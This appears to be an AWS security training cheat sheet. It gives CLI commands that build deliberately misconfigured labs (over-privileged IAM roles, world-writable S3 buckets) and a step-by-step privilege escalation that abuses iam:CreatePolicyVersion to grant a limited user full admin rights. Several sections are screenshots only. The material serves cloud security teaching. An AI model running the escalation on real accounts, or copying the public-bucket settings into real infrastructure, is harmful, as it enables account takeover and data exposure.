# AWS-cheatsheet


#overly permissive IAM roles


aws iam create-user --user-name s3ReadUser --tags Key=createdFor,Value=masterclass --profile masterclass
aws iam attach-user-policy --user-name s3ReadUser --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --profile masterclass




aws iam create-user --user-name EC2DescribeOnlyUser --tags Key=createdFor,Value=masterclass --profile masterclass
aws iam attach-user-policy --user-name EC2DescribeOnlyUser --policy-arn arn:aws:iam::aws:policy/AmazonEC2ReadOnlyAccess --profile masterclass
aws iam create-group --group-name EC2ManagementUsers --profile masterclass
aws iam attach-group-policy --group-name EC2ManagementUsers --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess --profile masterclass
aws iam add-user-to-group --user-name EC2DescribeOnlyUser --group-name EC2ManagementUsers --profile masterclass




aws iam create-role --role-name EC2RDSReadRole --assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ec2.amazonaws.com"},"Action":"sts:AssumeRole"}]}' --tags Key=createdFor,Value=masterclass --profile masterclass
aws iam attach-role-policy --role-name EC2RDSReadRole --policy-arn arn:aws:iam::aws:policy/AmazonRDSFullAccess --profile masterclass
aws iam attach-role-policy --role-name EC2RDSReadRole --policy-arn arn:aws:iam::aws:policy/IAMFullAccess --profile masterclass
aws iam attach-role-policy --role-name EC2RDSReadRole --policy-arn arn:aws:iam::aws:policy/AmazonEC2FullAccess --profile masterclass
















--------------------------------------------------------------------------------------------------------------------

#iam privilege escalation using policy version rollback , we can set default policy as well to previous version and escalate



Run an admin command like list-users to see that the limiteduser has no access

aws iam list-users --profile masterclasslimiteduser

Identify the policies attached to the user using the new profile with AWS CLI

aws iam list-attached-user-policies --user-name limiteduser --profile masterclasslimiteduser

Get the version of the identified policy - policyversionmanager

aws iam get-policy --policy-arn POLICY-ARN --profile masterclasslimiteduser


Get the permissions attached to the policy for version v1 - policyversionmanager

aws iam get-policy-version --policy-arn POLICY-ARN --version-id v1 --profile masterclasslimiteduser

One of the permissions attached is "iam:CreatePolicyVersion"

We can use this to create a new version of the attached policy with privileged access

aws iam create-policy-version --policy-arn POLICY-ARN --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' --set-as-default --profile masterclasslimiteduser

Run an admin command now to confirm your privileges have escalated to AWS AdministratorAccess

aws iam list-users  --profile masterclasslimiteduser




#iam privilege escalation based on groups  

<img width="981" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/de94a793-2c5f-46ea-874b-20af2817c4c1">




------------------------------------------------------------


# EC2 




AMI catalog:

https://us-east-1.console.aws.amazon.com/ec2/home?region=us-east-1#AMICatalog:

From console we can see the public AMI's which might be backdoor ami's as well.

Navigate to EC2 > AMI Catalog and find the “masterclass” AMI under Community AMIs

For AWS CLI ...

Run the following command to find AMIs belonging to the account 511522223657

aws ec2 describe-images --owners 511522223657 --profile masterclass

aws ec2 describe-images --owners 511522223657 --query 'Images[*].[ImageId, Name, PlatformDetails]' --profile masterclass

aws ec2 describe-images --filters "Name=name,Values=session5-warfare" --profile masterclass


<img width="1241" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/d8511ce2-59b4-4bcc-b1d6-0d9398ea592d">


<img width="1241" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/a07c4d3c-36e9-44ad-b621-acfe884e94dd">








#use instance id to see if volume is encrypted or not

Use the instance id to enumerate attached volumes (also visible in the UI)

aws ec2 describe-instances --instance-ids <instance-id> --query "Reservations[].Instances[].BlockDeviceMappings[].Ebs[].VolumeId" --region us-east-1 --profile masterclass


aws ec2 describe-volumes --volume-ids <volume-id> --query "Volumes[].Encrypted" --region us-east-1 --profile masterclass





#Use the snapshot id to check for encryption status (also visible in the UI)

aws ec2 describe-snapshots --snapshot-ids snap-043dabe339601b7a0 --query "Snapshots[].Encrypted" --region us-east-1 --profile masterclass





#ec2 misconfigurations



<img width="1241" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/341e1b48-6063-4f1a-a3aa-dc2aa3ffaefe">


<img width="1241" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/2f81069d-4c07-4f95-b60f-615e345e6101">





Check the security groups for inbound rules




<img width="1241" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/550d911f-8cd7-49d5-8540-d8f69d246e06">



SSRF using IMDS



<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/78731613-b1db-4dc1-8cbb-f6f1c92bd2b1">




Access and passrole , using policy version

<img width="981" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/c8c0d36f-a6c8-4c24-a95a-c78506ae394d">





-----------------------------------------------------------------------------------------------------------------



#s3 bucket


export UNAME=`curl -s http://x41.co/random.php`
export bucketname=$UNAME-public-bucket

aws s3api create-bucket --bucket $bucketname --region us-east-1 --profile masterclass
aws s3api put-public-access-block --bucket $bucketname --public-access-block-configuration "BlockPublicPolicy=false" --profile masterclass
aws s3api put-bucket-ownership-controls --bucket $bucketname --ownership-controls="Rules=[{ObjectOwnership=BucketOwnerPreferred}]" --profile masterclass
wget https://aws-masterclass-data.s3.amazonaws.com/session3/boat.jpg
wget https://aws-masterclass-data.s3.amazonaws.com/session3/public.txt
aws s3api put-object --bucket $bucketname --key boat.jpg --body boat.jpg --profile masterclass
aws s3api put-object --bucket $bucketname --key public.txt --body public.txt --profile masterclass
aws s3api put-bucket-acl --bucket $bucketname --acl public-read-write --profile masterclass



export objbucketname=$bucketname-public-objects

aws s3api create-bucket --bucket $objbucketname --region us-east-1 --profile masterclass
aws s3api put-public-access-block --bucket $objbucketname --public-access-block-configuration "BlockPublicPolicy=false" --profile masterclass
aws s3api put-bucket-ownership-controls --bucket $objbucketname --ownership-controls="Rules=[{ObjectOwnership=BucketOwnerPreferred}]" --profile masterclass
aws s3api put-object --bucket $objbucketname --key boat.jpg --body boat.jpg --profile masterclass
aws s3api put-object --bucket $objbucketname --key public.txt --body public.txt --profile masterclass
aws s3api put-bucket-acl --bucket $objbucketname --acl public-read-write --profile masterclass
aws s3api put-bucket-policy --bucket $objbucketname --policy "{\"Version\":\"2012-10-17\",\"Statement\":[{\"Sid\":\"PublicRead\",\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":[\"s3:GetObject\"],\"Resource\":[\"arn:aws:s3:::$objbucketname/*\"]}]}" --profile masterclass




export aclrwbucket=$UNAME-bucket-acl-rw

aws s3api create-bucket --bucket $aclrwbucket --region us-east-1 --profile masterclass
aws s3api put-bucket-ownership-controls --bucket $aclrwbucket --ownership-controls="Rules=[{ObjectOwnership=BucketOwnerPreferred}]" --profile masterclass
aws s3api put-public-access-block --bucket $aclrwbucket --public-access-block-configuration "BlockPublicPolicy=false" --profile masterclass
aws s3api put-bucket-acl --bucket $aclrwbucket --grant-read-acp uri=http://acs.amazonaws.com/groups/global/AllUsers --grant-write-acp uri=http://acs.amazonaws.com/groups/global/AuthenticatedUsers --profile masterclass





<img width="1241" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/f1f3dce0-8461-4408-9421-bb2f658f90cf">








------------------------------------------------------------------------------------

# lambda invocation



<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/c85e8e71-1a8d-4c14-834a-1763eae46e82">




<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/79aba158-0678-481c-b9ac-42b9cbb31088">



<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/0f57a7db-02d8-4430-991f-8a5f5878b343">



<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/8b88ffea-7583-4ab4-9f9c-c869fdf8f258">




---------------------------------------------------------------------------------------------------------------------------------


# RDS snapshots




<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/2deac7d1-a92e-4735-a155-f45391ea6b2c">


<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/8041851e-4a53-43ca-964f-6db9db9cc3d2">



<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/30d12520-3491-4482-a0ef-a856dcbbbcd3">



<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/0c3ae238-80b0-445e-89bc-f2769cf0cf67">




<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/9ea4818c-835d-435b-bafc-0f73dd58baa0">




<img width="1212" alt="image" src="https://github.com/mohdhaji87/AWS-cheatsheet/assets/8140763/f88a52be-a696-4bce-833d-5cf4eb8ab753">


